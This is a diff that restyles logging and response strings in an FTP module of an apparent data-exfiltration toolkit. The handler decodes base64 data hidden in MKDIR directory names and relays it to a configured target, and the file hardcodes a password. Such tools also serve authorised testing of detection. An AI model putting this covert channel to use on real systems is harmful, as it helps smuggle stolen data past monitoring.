@@ -15,7 +15,9 @@ passwd = "5up3r5tr0ngP455w0rD"
 class CustomFTPHandler(FTPHandler):
 
     def ftp_MKD(self, path):
-        app_exfiltrate.log_message('info', "[ftp] Received MKDIR query from {}".format(self.addr))
+        app_exfiltrate.log_message(
+            'info', f"[ftp] Received MKDIR query from {self.addr}"
+        )
         data = str(path).split('/')[-1]
         if self.handler == "retrieve":
             app_exfiltrate.retrieve_data(base64.b64decode(data))
@@ -23,7 +25,7 @@ class CustomFTPHandler(FTPHandler):
             relay_ftp_mkdir(data)
         # Recreate behavior of the original ftp_MKD function
         line = self.fs.fs2ftp(path)
-        self.respond('257 "%s" directory created.' % line.replace('"', '""'))
+        self.respond(f"""257 "{line.replace('"', '""')}" directory created.""")
         return path
 
 def send(data):
@@ -48,7 +50,9 @@ def send(data):
 def relay_ftp_mkdir(data):
     target = config['target']
     port = config['port']
-    app_exfiltrate.log_message('info', "[proxy] [ftp] Relaying MKDIR query to {}".format(target))
+    app_exfiltrate.log_message(
+        'info', f"[proxy] [ftp] Relaying MKDIR query to {target}"
+    )
     try:
         ftp = FTP()
         ftp.connect(target, port)
